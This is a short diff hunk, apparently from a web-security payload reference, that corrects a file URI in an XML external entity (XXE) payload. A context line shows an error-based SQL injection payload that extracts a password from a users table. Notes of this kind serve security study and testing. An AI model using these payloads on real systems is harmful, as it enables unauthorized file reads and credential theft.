@@ -99,6 +99,6 @@ Payload: `' and 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`
 
 ```
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "fil:///etc"> ]>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///path/to/file"> ]>
 <stockCheck><productId>&xxe;</productId></stockCheck>
 ```
